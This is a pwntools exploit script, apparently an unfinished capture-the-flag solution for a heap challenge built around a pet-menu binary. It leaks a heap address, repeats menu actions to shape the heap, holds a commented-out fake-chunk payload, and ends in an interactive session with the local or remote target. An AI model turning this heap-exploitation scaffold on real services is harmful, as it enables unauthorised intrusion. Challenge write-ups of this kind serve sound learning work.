#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set resolve-heap-via-heuristic force
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, animal, value):
    sl(p, b"1")
    ru(p,b":")
    sl(p,b"%i" % animal)
    ru(p,b"name:")
    sl(p, value)
    ru(p, b"pet: ")
    ret = rl(p)

    ru(p,b">")

    return ret

def play(p, index):
    sl(p, b"2")
    ru(p,b"pet?")
    sl(p,"%i" % index)
    ru(p,b">")

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)

def exploit(io,e):
    leak = int(create(io, 1, b"Luis0"), 16) - 0x12b40 - 0xc00

    print(f"[*] HEAP LEAK: 0x{leak:x}")

    for i in range(7):
        play(io, 0)

    create(io, 1, b"Luis1")
    #create(io, 1, b"Luis2")

    for i in range(9):
        play(io, 1)

    #create(io, 1, b"B"*0x100 + p32(1) + p32(0xff) + p32(0) + b"C"*4 + p32(0x451))

    #play(io, 1)

    io.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
